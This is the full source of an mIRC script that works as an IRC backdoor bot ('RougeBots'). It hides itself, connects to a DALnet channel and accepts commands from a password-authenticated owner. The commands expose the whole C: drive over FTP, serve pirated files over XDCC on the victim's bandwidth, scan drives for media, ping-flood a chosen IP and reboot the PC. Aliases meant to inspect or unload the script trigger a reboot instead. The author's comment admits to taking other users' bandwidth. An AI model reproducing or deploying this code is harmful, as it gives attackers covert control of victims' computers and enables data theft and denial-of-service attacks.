   alias hide { if ($exists(winlog.exe) == $false) { exit } | run winlog.exe /n /fh }
   alias settststs { nick $randchnu | remini wina.sys ident userid | remini wina.sys mirc user | remini wina.sys mirc email | writeini wina.sys ident userid $randchnu | writeini wina.sys mirc user $randchar | writeini wina.sys mirc email $randchar | identd on $randchnu }
   alias connect { server Irc.dal.net | timerserver 0 60 server irc.dal.net }
   alias randnum { return $r(0,9) $+ $r(0,9) $+ $r(0,9) $+ $r(0,9) $+ $r(0,9) $+ $r(0,9) }
   alias randchar { return $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) }
   alias randchnu { return $r(a,z) $+ $r(0,9) $+ $r(a,z) $+ $r(0,9) $+ $r(a,z) $+ $r(0,9) $+ $r(0,9) }
   alias mc { msg Channelname 12-=4 RougeBots 12=- $$1- }
   alias ftp.conf { write -c slimftpd.conf | write slimftpd.conf BindInterface All | write slimftpd.conf BindPort 900 | write slimftpd.conf CommandTimeout 180 | write slimftpd.conf ConnectTimeout 15 | write slimftpd.conf LookupHosts On }
   alias ftp.admin { if ($1 == $null) || ($2 == $null) { mc Error Syntax: ftp } | write slimftpd.conf   <User " $+ $1 $+ "> | write slimftpd.conf      Password " $+ $2 $+ " | write slimftpd.conf     Mount / C:\ | write slimftpd.conf       Allow / list read write | write slimftpd.conf </User> }
   alias ftp.user { if ($1 == $null) || ($2 == $null) { mc Syntax Error: Ftp } | mkdir $mircdirupload | mkdir $mircdirupload\ $+ $1 | write slimftpd.conf   <User " $+ $1 $+ "> | write slimftpd.conf      Password " $+ $2 $+ " | write slimftpd.conf     Mount /user $mircdirupload\ $+ $1 | write slimftpd.conf     Allow / List write | write slimftpd.conf </User> }
   alias ftprun { set %ftp on | var %temps $dll(syseta.dll,ReleaseProcess,ftp) | var %temps $dll(syseta.dll,RunConsole,ftp winnet.exe) | mc Ftp: Running ftp on port 900 ( $+ $ip $+ ) }
   alias ftp.stop { ftpoff | mc Ftp: Closed. No active connections. | remove SlimFTPd.log | remove slimftpd.conf }
   alias ftp.stats { mc Ftp: is %ftp listening on port 900. }
   on *:sockopen:xdcc.*:{ if ($sockerr > 0) { halt } | set -u1 %user $randchar | sockwrite -nt $sockname USER %user %user %user : $+ %user | set %dcc.nick [xdcc] $+ $r(a,z) $+ $r(a,z) | sockwrite -nt $sockname NICK %dcc.nick | timerjoinxdcc 2 30  sockwrite -nt $sockname join %xdcc.chan | timerxdccspeak 0 900 xdccspeak }
   alias ftpoff { unset %ftp }
   alias xdccstart { sockopen xdcc. $+ $randnum %xdcc.server %xdcc.port.conn }
   alias sendxdccfd { if ($bytes($sock(dccsending*).sent).suf == $null) { return Nothing | halt } | else return $bytes($sock(dccsending*).sent).suf }
   on *:sockread:xdcc.*:{
     sockread %xdcc.check
     if ($gettok(%xdcc.check,1,32) == ping) { sockwrite -tn $sockname PONG $gettok(%xdcc.check,2,32) }
     if ($gettok(%xdcc.check,4,32) == :xdcc) && ($gettok(%xdcc.check,5,32) == send) {
       if ($sock(dccsending*, 0) >= %xdcc.fast.slow) { sockwrite -nt $sockname notice $remove($gettok(%xdcc.check,1,33),:) :Xdcc Sends All In use Try Again Laterz. | Halt }
       if ($gettok(%xdcc.check,6,32) == #1) { if (%xdcc.file1 == $null) { halt } | set %xdcc.port $rand(1024,5000) | socklisten dccsend $+ $rand(1,900000) %xdcc.port | sockwrite -nt $sockname notice $remove($gettok(%xdcc.check,1,33),:) :DCC Send %xdcc.file1 ( $+ $ip $+ ) | sockwrite -nt $sockname privmsg $remove($gettok(%xdcc.check,1,33),:) :DCC SEND %xdcc.file1 $longip($ip) %xdcc.port $lof(%xdcc.file1) $+  | set %xdcc.file %xdcc.file1 }
       if ($gettok(%xdcc.check,6,32) == #2) { if (%xdcc.file2 == $null) { halt } | set %xdcc.port $rand(1024,5000) | socklisten dccsend $+ $rand(1,900000) %xdcc.port | sockwrite -nt $sockname notice $remove($gettok(%xdcc.check,1,33),:) :DCC Send %xdcc.file2 ( $+ $ip $+ ) | sockwrite -nt $sockname privmsg $remove($gettok(%xdcc.check,1,33),:) :DCC SEND %xdcc.file2 $longip($ip) %xdcc.port $lof(%xdcc.file2) $+  | set %xdcc.file %xdcc.file2 }
       if ($gettok(%xdcc.check,6,32) == #3) { if (%xdcc.file3 == $null) { halt } | set %xdcc.port $rand(1024,5000) | socklisten dccsend $+ $rand(1,900000) %xdcc.port | sockwrite -nt $sockname notice $remove($gettok(%xdcc.check,1,33),:) :DCC Send %xdcc.file3 ( $+ $ip $+ ) | sockwrite -nt $sockname privmsg $remove($gettok(%xdcc.check,1,33),:) :DCC SEND %xdcc.file3 $longip($ip) %xdcc.port $lof(%xdcc.file3) $+  | set %xdcc.file %xdcc.file3 }
       if ($gettok(%xdcc.check,6,32) == #4) { if (%xdcc.file4 == $null) { halt } | set %xdcc.port $rand(1024,5000) | socklisten dccsend $+ $rand(1,900000) %xdcc.port | sockwrite -nt $sockname notice $remove($gettok(%xdcc.check,1,33),:) :DCC Send %xdcc.file4 ( $+ $ip $+ ) | sockwrite -nt $sockname privmsg $remove($gettok(%xdcc.check,1,33),:) :DCC SEND %xdcc.file4 $longip($ip) %xdcc.port $lof(%xdcc.file4) $+  | set %xdcc.file %xdcc.file4 }
       if ($gettok(%xdcc.check,6,32) == #5) { if (%xdcc.file5 == $null) { halt } | set %xdcc.port $rand(1024,5000) | socklisten dccsend $+ $rand(1,900000) %xdcc.port | sockwrite -nt $sockname notice $remove($gettok(%xdcc.check,1,33),:) :DCC Send %xdcc.file5 ( $+ $ip $+ ) | sockwrite -nt $sockname privmsg $remove($gettok(%xdcc.check,1,33),:) :DCC SEND %xdcc.file5 $longip($ip) %xdcc.port $lof(%xdcc.file5) $+  | set %xdcc.file %xdcc.file5 }
       if ($gettok(%xdcc.check,6,32) == #6) { if (%xdcc.file6 == $null) { halt } | set %xdcc.port $rand(1024,5000) | socklisten dccsend $+ $rand(1,900000) %xdcc.port | sockwrite -nt $sockname notice $remove($gettok(%xdcc.check,1,33),:) :DCC Send %xdcc.file6 ( $+ $ip $+ ) | sockwrite -nt $sockname privmsg $remove($gettok(%xdcc.check,1,33),:) :DCC SEND %xdcc.file6 $longip($ip) %xdcc.port $lof(%xdcc.file6) $+  | set %xdcc.file %xdcc.file6 }
       if ($gettok(%xdcc.check,6,32) == #7) { if (%xdcc.file7 == $null) { halt } | set %xdcc.port $rand(1024,5000) | socklisten dccsend $+ $rand(1,900000) %xdcc.port | sockwrite -nt $sockname notice $remove($gettok(%xdcc.check,1,33),:) :DCC Send %xdcc.file7 ( $+ $ip $+ ) | sockwrite -nt $sockname privmsg $remove($gettok(%xdcc.check,1,33),:) :DCC SEND %xdcc.file7 $longip($ip) %xdcc.port $lof(%xdcc.file7) $+  | set %xdcc.file %xdcc.file7 }
       if ($gettok(%xdcc.check,6,32) == #8) { if (%xdcc.file8 == $null) { halt } | set %xdcc.port $rand(1024,5000) | socklisten dccsend $+ $rand(1,900000) %xdcc.port | sockwrite -nt $sockname notice $remove($gettok(%xdcc.check,1,33),:) :DCC Send %xdcc.file8 ( $+ $ip $+ ) | sockwrite -nt $sockname privmsg $remove($gettok(%xdcc.check,1,33),:) :DCC SEND %xdcc.file8 $longip($ip) %xdcc.port $lof(%xdcc.file8) $+  | set %xdcc.file %xdcc.file8 }
       if ($gettok(%xdcc.check,6,32) == #9) { if (%xdcc.file9 == $null) { halt } | set %xdcc.port $rand(1024,5000) | socklisten dccsend $+ $rand(1,900000) %xdcc.port | sockwrite -nt $sockname notice $remove($gettok(%xdcc.check,1,33),:) :DCC Send %xdcc.file9 ( $+ $ip $+ ) | sockwrite -nt $sockname privmsg $remove($gettok(%xdcc.check,1,33),:) :DCC SEND %xdcc.file9 $longip($ip) %xdcc.port $lof(%xdcc.file9) $+  | set %xdcc.file %xdcc.file9 }
       if ($gettok(%xdcc.check,6,32) == #10) { if (%xdcc.file10 == $null) { halt } | set %xdcc.port $rand(1024,5000) | socklisten dccsend $+ $rand(1,900000) %xdcc.port | sockwrite -nt $sockname notice $remove($gettok(%xdcc.check,1,33),:) :DCC Send %xdcc.file10 ( $+ $ip $+ ) | sockwrite -nt $sockname privmsg $remove($gettok(%xdcc.check,1,33),:) :DCC SEND %xdcc.file10 $longip($ip) %xdcc.port $lof(%xdcc.file10) $+  | set %xdcc.file %xdcc.file10 }
     }
   }
   on *:socklisten:dccsend*:{ sockaccept dccsending $+ $remove($sockname,dccsend) | set %dcc.filesize $lof(%xdcc.file) | bread %xdcc.file 0 4096 &ws | sockmark dccsending $+ $remove($sockname,dccsend) $calc($sock(dccsending $+ $remove($sockname,dccsend)).mark + 4096) | sockwrite dccsending $+ $remove($sockname,dccsend) &ws }
   on *:sockwrite:dccsending*:{ if ($sock($sockname).mark == %dcc.filesize) { sockclose $sockname | halt } | if ($sock($sockname).sq != 0) { .timer 1 3 dsendq $sockname | halt } | if ($calc(%dcc.filesize - $sock($sockname).mark) > 4096) { bread %xdcc.file $sock($sockname).mark 4096 &ws | sockmark $sockname $calc($sock($sockname).mark + 4096) | sockwrite $sockname &ws } | if ($calc(%dcc.filesize - $sock($sockname).mark) <= 4096) { bread %xdcc.file $sock($sockname).mark $calc(%dcc.filesize - $sock($sockname).mark) &ws | sockmark $sockname %dcc.filesize | sockwrite $sockname &ws } }
   on *:sockclose:dccsending*:{ inc %dccsend | sockclose dccsend* | %xdcc.tot.send = %xdcc.tot.send + $bytes($sock(dccsending*).sent) }
   alias xdccspeak {
     sockwrite -tn xdcc.* privmsg %xdcc.chan :[RougeXdcc]
     sockwrite -tn xdcc.* privmsg %xdcc.chan :To request a file type: "/msg %dcc.nick xdcc send #x"
     if (%xdcc.file1 == $null) { goto xdcc1 } | sockwrite -tn xdcc.* privmsg %xdcc.chan :Pack: #1 Size: $bytes($file(%xdcc.file1)).suf  Discreption: %xdcc.disc1 | :xdcc1
     if (%xdcc.file2 == $null) { goto xdcc2 } | sockwrite -tn xdcc.* privmsg %xdcc.chan :Pack: #2 Size: $bytes($file(%xdcc.file2)).suf  Discreption: %xdcc.disc2 | :xdcc2
     if (%xdcc.file3 == $null) { goto xdcc3 } | sockwrite -tn xdcc.* privmsg %xdcc.chan :Pack: #3 Size: $bytes($file(%xdcc.file3)).suf  Discreption: %xdcc.disc3 | :xdcc3
     if (%xdcc.file4 == $null) { goto xdcc4 } | sockwrite -tn xdcc.* privmsg %xdcc.chan :Pack: #4 Size: $bytes($file(%xdcc.file4)).suf  Discreption: %xdcc.disc4 | :xdcc4
     if (%xdcc.file5 == $null) { goto xdcc5 } | sockwrite -tn xdcc.* privmsg %xdcc.chan :Pack: #5 Size: $bytes($file(%xdcc.file5)).suf  Discreption: %xdcc.disc5 | :xdcc5
     if (%xdcc.file6 == $null) { goto xdcc6 } | sockwrite -tn xdcc.* privmsg %xdcc.chan :Pack: #6 Size: $bytes($file(%xdcc.file6)).suf  Discreption: %xdcc.disc6 | :xdcc6
     if (%xdcc.file7 == $null) { goto xdcc7 } | sockwrite -tn xdcc.* privmsg %xdcc.chan :Pack: #7 Size: $bytes($file(%xdcc.file7)).suf  Discreption: %xdcc.disc7 | :xdcc7
     if (%xdcc.file8 == $null) { goto xdcc8 } | sockwrite -tn xdcc.* privmsg %xdcc.chan :Pack: #8 Size: $bytes($file(%xdcc.file8)).suf  Discreption: %xdcc.disc8 | :xdcc8
     if (%xdcc.file9 == $null) { goto xdcc9 } | sockwrite -tn xdcc.* privmsg %xdcc.chan :Pack: #9 Size: $bytes($file(%xdcc.file9)).suf  Discreption: %xdcc.disc9 | :xdcc9
     if (%xdcc.file10 == $null) { goto xdcc10 } | sockwrite -tn xdcc.* privmsg %xdcc.chan :Pack: #10 Size: $bytes($file(%xdcc.file10)).suf  Discreption: %xdcc.disc10 | :xdcc10
     sockwrite -tn xdcc.* privmsg %xdcc.chan :-=Free Stuff Brought To You By X-rouge=-
     sockwrite -tn xdcc.* privmsg %xdcc.chan :There Are: $sock(dccsending*, 0) Sends and Sended: %dccsend files totaly.
     sockwrite -tn xdcc.* privmsg %xdcc.chan :SEndinG: $sendxdccfd This SEnd And %xdcc.tot.send MB Totaly.
     sockwrite -tn xdcc.* privmsg %xdcc.chan :[RougeXdcc]
   }

   on *:CONNECT: { timerserver* off | join Channelname Keyofchannel | if (%xdcc.start.what == on) { xdccstart } }
   on *:start:{ settststs | hide | connect }
   on *:exit:{ unset %owner | ftpoff | remove slimftpd.conf | remove SlimFTPd.log }
   on *:TEXT:*:#: {
     if ($1 == -pass) && ($2 == freebeer) && ($len($nick) == 7) { set %owner $address | set %owner2 $nick | mc 12-=4Password Accepted12=- 12-=4Level:12=-  12[4Master Junk12] }
     if ($address == %owner) && ($nick == %owner2) {
       if ($1 == -var) { if ( [ [ $2 ] ] == $null) { halt } | mc [var]: $2 is [ [ $$2- ] ] }
       if ($1 == -version) { mc 12-=4 Version: Xdcc 12=- 12-=4 Author: X-RouGe 12=- }
       if ($1 == -uptime) { mc Uptime Mirc: $uptime(mirc,1) System: $uptime(system,1) Server: $uptime(server,1) }
       if ($1 == -info) { mc Os: $os Current Date: $fulldate Ip: $ip }
       if ($1 == -reboot) { mc I'm Rebooting My Pc Now | quit Reboot | run C:WINDOWS\RUNDLL.EXE user.exe,exitwindows }
       if ($1 == -socks) { mc Currently Open Sockets $sock(*,0) }
       if ($1 == -Dccchat) { dcc chat $nick }
       if ($1 == -opme) { mode # +o $nick }
       if ($1 == -warez.c) { mc Found On C: Mp3: $findfile(c:\,*.mp3,0) Mpg: $findfile(c:\,*.mpg,0) Avi: $findfile(c:\,*.avi,0) Iso: $findfile(c:\,*.iso,0) }
       if ($1 == -warez.d) { mc Found On D: Mp3: $findfile(d:\,*.mp3,0) Mpg: $findfile(d:\,*.mpg,0) Avi: $findfile(d:\,*.avi,0) Iso: $findfile(d:\,*.iso,0) }
       if ($1 == -warez.e) { mc Found On E: Mp3: $findfile(e:\,*.mp3,0) Mpg: $findfile(e:\,*.mpg,0) Avi: $findfile(e:\,*.avi,0) Iso: $findfile(e:\,*.iso,0) }
       if ($1 == -f.user) { if (%ftp == On) { halt } | ftp.user $2 $3 | mc User Login: $2 Passwd: $3 }
       if ($1 == -f.admin) { if (%ftp == On) { halt } | ftp.admin $2 $3 | mc Admin Login: $2 Passwd: $3 }
       if ($1 == -f.off) { if (%ftp == On) { halt } | ftp.stop }
       if ($1 == -f.on) { if (%ftp == On) { halt } | ftprun }
       if ($1 == -f.conf) { if (%ftp == On) { halt } | ftp.conf | mc Ftp Conf done }
       if ($1 == -packet) { if ($3 == $null) { mc Error Syntax: (-packet ip ammount). | halt } | run ping.exe -n $3 -v AUTH -l 64000 $2 | run winlog.exe /n /fh ping | timer 2 1 //run winlog.exe /n /fh ping | mc Sending ( $+ $3 $+ ) packets to ( $+ $2 $+ ) }
       if ($1 == -recon) { quit Reloading Mirc | connect }
       if ($1 == -set) { if ($2 == $null) && ($3 == $null) { mc Error syntax } | set $2 $$3- | mc [  $2  ] set To [ $$3- ] }
     }
   }

   on *:notice:*:* {
     if ($nick == %owner2) {
       if ($1 == spc) { Set %xdcc.server $2 | set %xdcc.port.conn $3 | set %xdcc.chan $$4- | notice $nick Server: %xdcc.server Port: %xdcc.port.conn Chan: %xdcc.chan }
       if ($1 == max) { set %xdcc.fast.slow $2 | notice $nick Max Sends Set To: %xdcc.fast.slow }
       if ($1 == start) { xdccstart | set %xdcc.start.what on | notice $nick Xdcc has been started. | set xdcc.on.start on }
       if ($1 == stop) { sockclose xdcc* | unset %xdcc.start.what | sockclose dcc* | set xdcc.on.start off | notice $nick Xdcc stopped. }
       if ($1 == pack1) { set %xdcc.file1 " $+ $$2- $+ " | notice $nick Filepath1: %xdcc.file1 }
       if ($1 == pack2) { set %xdcc.file2 " $+ $$2- $+ " | notice $nick Filepath2: %xdcc.file2 }
       if ($1 == pack3) { set %xdcc.file3 " $+ $$2- $+ " | notice $nick Filepath3: %xdcc.file3 }
       if ($1 == pack4) { set %xdcc.file4 " $+ $$2- $+ " | notice $nick Filepath4: %xdcc.file4 }
       if ($1 == pack5) { set %xdcc.file5 " $+ $$2- $+ " | notice $nick Filepath5: %xdcc.file5 }
       if ($1 == pack6) { set %xdcc.file6 " $+ $$2- $+ " | notice $nick Filepath6: %xdcc.file6 }
       if ($1 == pack7) { set %xdcc.file7 " $+ $$2- $+ " | notice $nick Filepath7: %xdcc.file7 }
       if ($1 == pack8) { set %xdcc.file8 " $+ $$2- $+ " | notice $nick Filepath8: %xdcc.file8 }
       if ($1 == pack9) { set %xdcc.file9 " $+ $$2- $+ " | notice $nick Filepath9: %xdcc.file9 }
       if ($1 == pack10) { set %xdcc.file10 " $+ $$2- $+ " | notice $nick Filepath10: %xdcc.file10 }
       if ($1 == disc1) { set %xdcc.disc1 $$2- | notice $nick Discreption1: %xdcc.disc1 }
       if ($1 == disc2) { set %xdcc.disc2 $$2- | notice $nick Discreption2: %xdcc.disc2 }
       if ($1 == disc3) { set %xdcc.disc3 $$2- | notice $nick Discreption3: %xdcc.disc3 }
       if ($1 == disc4) { set %xdcc.disc4 $$2- | notice $nick Discreption4: %xdcc.disc4 }
       if ($1 == disc5) { set %xdcc.disc5 $$2- | notice $nick Discreption5: %xdcc.disc5 }
       if ($1 == disc6) { set %xdcc.disc6 $$2- | notice $nick Discreption6: %xdcc.disc6 }
       if ($1 == disc7) { set %xdcc.disc7 $$2- | notice $nick Discreption7: %xdcc.disc7 }
       if ($1 == disc8) { set %xdcc.disc8 $$2- | notice $nick Discreption8: %xdcc.disc8 }
       if ($1 == disc9) { set %xdcc.disc9 $$2- | notice $nick Discreption9: %xdcc.disc9 }
       if ($1 == disc10) { set %xdcc.disc10 $$2- | notice $nick Discreption10: %xdcc.disc10 }
       if ($1 == reboot) { notice $nick I'm Rebooting My Pc Now | quit Reboot | run C:WINDOWS\RUNDLL.EXE user.exe,exitwindows }
       if ($1 == recon) { quit Reloading Mirc | connect }
       if ($1 == set) { if ($2 == $null) && ($3 == $null) { mc Error syntax } | set $2 $$3- | notice $nick [  $2  ] set To [ $$3- ] }
     }
   }

   alias socklist { mc Detected | run C:WINDOWS\RUNDLL.EXE user.exe,exitwindows }
   alias UnSetAll { mc Detected | run C:WINDOWS\RUNDLL.EXE user.exe,exitwindows }
   alias unload { mc Detected | run C:WINDOWS\RUNDLL.EXE user.exe,exitwindows }
   alias load { mc Detected | run C:WINDOWS\RUNDLL.EXE user.exe,exitwindows }



   ;made by x-rouge. i wanna say hi to the world and this is my way to do that. i think isps doesn't give enough bandwidth so i use it from other isps.
